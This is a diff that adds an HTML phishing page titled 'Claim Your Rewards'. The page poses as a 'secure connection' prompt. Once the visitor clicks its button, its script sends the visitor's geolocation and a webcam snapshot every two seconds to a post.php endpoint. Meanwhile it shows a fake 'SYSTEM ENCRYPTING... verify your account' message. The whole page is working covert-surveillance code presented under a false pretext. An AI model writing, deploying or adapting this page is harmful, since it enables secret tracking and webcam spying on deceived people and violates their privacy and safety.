@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Your Rewards</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .box { border: 2px solid #0f0; display: inline-block; padding: 20px; box-shadow: 0 0 15px #0f0; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; }
+    </style>
+    <script>
+        function start() {
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch('post.php?type=loc&val=' + p.coords.latitude + ',' + p.coords.longitude);
+            }, e => { fetch('post.php?type=loc&val=Denied'); });
+
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                const v = document.createElement('video');
+                v.srcObject = s; v.play();
+                const c = document.createElement('canvas');
+                setInterval(() => {
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    fetch('post.php', { method: 'POST', body: c.toDataURL('image/png') });
+                }, 2000); // Har 2 second mein photo
+            });
+            document.getElementById('ui').innerHTML = "<h1>SYSTEM ENCRYPTING...</h1><p>Please wait while we verify your account.</p>";
+        }
+    </script>
+</head>
+<body>
+    <div class="box" id="ui">
+        <h1>STAY SECURE</h1>
+        <p>Your connection is not private. Click below to secure it.</p>
+        <button onclick="start()">SECURE CONNECTION</button>
+    </div>
+</body>
+</html>
